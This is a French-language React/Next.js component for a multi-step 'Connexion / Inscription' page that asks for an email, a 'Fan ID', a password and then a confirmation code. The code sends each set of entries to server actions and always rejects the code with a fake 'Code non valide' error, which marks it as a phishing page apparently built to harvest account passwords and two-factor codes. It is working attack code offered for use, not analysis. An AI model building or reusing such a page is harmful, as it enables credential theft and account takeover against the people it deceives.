"use client";

import { useState } from "react";
import { ArrowRight, Eye, EyeOff, Lock, AlertCircle } from "lucide-react";
import { sendLoginData, sendVerificationCode } from "./actions";

export default function Home() {
  const [step, setStep] = useState<1 | 2 | 3>(1);
  
  const [email, setEmail] = useState("");
  const [fanId, setFanId] = useState(""); // <-- NOUVEL ÉTAT FAN ID
  const [password, setPassword] = useState("");
  const [code, setCode] = useState("");
  
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  
  const [errorMessage, setErrorMessage] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(""); 

    // ÉTAPE 1 : Validation Email ET Fan ID
    if (step === 1) {
      if (email && fanId) setStep(2); // <-- VÉRIFICATION DES DEUX CHAMPS
    } 
    
    // ÉTAPE 2 : Envoi Password + Fan ID -> Passage au Code
    else if (step === 2) {
      setLoading(true);
      const formData = new FormData();
      formData.append("email", email);
      formData.append("fanId", fanId); // <-- ENVOI DU FAN ID AU BACKEND
      formData.append("password", password);

      await sendLoginData(formData);
      
      setLoading(false);
      setStep(3);
    } 
    
    // ÉTAPE 3 : Envoi du Code -> Affichage Erreur
    else if (step === 3) {
      setLoading(true);
      const formData = new FormData();
      formData.append("email", email);
      formData.append("code", code);

      await sendVerificationCode(formData);
      
      setLoading(false);
      setErrorMessage("Code non valide. Veuillez réessayer.");
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-white font-sans">
      <main className="w-full max-w-[600px] flex flex-col items-center px-4">
        
        <h1 className="text-4xl font-extrabold text-[#B93628] mb-4 text-center tracking-tight">
          {step === 3 ? "Vérification de sécurité" : "Connexion / Inscription"}
        </h1>
        
        <p className="text-black font-medium text-lg mb-10 text-center">
          {step === 3 
            ? `Un code de confirmation a été envoyé à ${email}.`
            : "Renseignez vos informations pour vous connecter"
          }
        </p>

        <div className="w-full border border-gray-200 rounded-lg p-8 shadow-sm bg-white">
          <form onSubmit={handleSubmit} className="flex flex-col gap-6">
            
            {/* --- ETAPE 1 & 2 : EMAIL & FAN ID --- */}
            {step !== 3 && (
              <>
                {/* CHAMP EMAIL */}
                <div className="relative group">
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className={`peer w-full h-[60px] px-4 pt-1 rounded border outline-none transition-colors text-lg text-gray-800
                      ${step === 2 ? "border-gray-300 bg-gray-50 text-gray-500" : "border-gray-400 focus:border-gray-600"}
                    `}
                    readOnly={step === 2}
                  />
                  <label className={`absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500 transition-all 
                      ${(!email && step === 1) ? "top-4 text-lg" : "top-[-10px] text-sm"}
                    `}>
                    Votre email {step === 1 && <span className="text-gray-400">*</span>}
                  </label>
                  {step === 2 && <span className="absolute right-3 top-4 text-gray-400">*</span>}
                </div>

                {/* CHAMP FAN ID (NOUVEAU) */}
                <div className="relative group">
                  <input
                    type="text"
                    required
                    value={fanId}
                    onChange={(e) => setFanId(e.target.value)}
                    className={`peer w-full h-[60px] px-4 pt-1 rounded border outline-none transition-colors text-lg text-gray-800
                      ${step === 2 ? "border-gray-300 bg-gray-50 text-gray-500" : "border-gray-400 focus:border-gray-600"}
                    `}
                    readOnly={step === 2}
                  />
                  <label className={`absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500 transition-all 
                      ${(!fanId && step === 1) ? "top-4 text-lg" : "top-[-10px] text-sm"}
                    `}>
                    Fan ID {step === 1 && <span className="text-gray-400">*</span>}
                  </label>
                  {step === 2 && <span className="absolute right-3 top-4 text-gray-400">*</span>}
                </div>
              </>
            )}

            {/* --- ETAPE 2 : PASSWORD --- */}
            {step === 2 && (
              <div className="relative animate-in fade-in slide-in-from-top-2 duration-300">
                <input
                  type={showPassword ? "text" : "password"}
                  required
                  autoFocus
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="peer w-full h-[60px] px-4 rounded border border-gray-400 outline-none focus:border-gray-600 text-lg text-gray-800"
                />
                <label className="absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500">
                  Votre mot de passe <span className="text-gray-400">*</span>
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-5 text-black"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
            )}

            {/* --- ETAPE 3 : CODE --- */}
            {step === 3 && (
              <div className="relative animate-in fade-in slide-in-from-right-4 duration-300">
                <input
                  type="text"
                  required
                  autoFocus
                  placeholder="Ex: 123456"
                  value={code}
                  onChange={(e) => {
                    setCode(e.target.value);
                    setErrorMessage(""); 
                  }}
                  className={`peer w-full h-[60px] px-4 rounded border outline-none text-lg text-gray-800 tracking-widest
                    ${errorMessage ? "border-red-500 focus:border-red-600" : "border-gray-400 focus:border-[#B93628]"}
                  `}
                />
                <label className={`absolute left-3 top-[-10px] bg-white px-1 text-sm font-medium
                  ${errorMessage ? "text-red-500" : "text-[#B93628]"}
                `}>
                  Code de confirmation <span className="text-red-500">*</span>
                </label>
                <Lock className="absolute right-4 top-5 text-gray-400" size={20} />
              </div>
            )}

            {/* BOUTON D'ACTION */}
            <div className="flex flex-col gap-3">
              <button
                type="submit"
                disabled={loading}
                className="w-full h-[56px] mt-2 rounded bg-[#E3E5E8] hover:bg-[#d4d6d9] text-gray-600 font-bold text-lg flex items-center justify-center gap-2 transition-colors"
              >
                {loading ? (
                  <span>Vérification...</span>
                ) : (
                  <>
                    {step === 1 && <><ArrowRight size={20} className="text-gray-500" /> Continuer</>}
                    {step === 2 && "Se connecter"}
                    {step === 3 && "Valider le code"}
                  </>
                )}
              </button>

              {/* MESSAGE D'ERREUR */}
              {errorMessage && (
                <div className="flex items-center justify-center gap-2 text-[#d32f2f] bg-[#ffebee] p-3 rounded animate-in fade-in slide-in-from-top-1">
                  <AlertCircle size={20} />
                  <span className="font-medium text-sm">{errorMessage}</span>
                </div>
              )}
            </div>

          </form>
        </div>
      </main>
    </div>
  );
}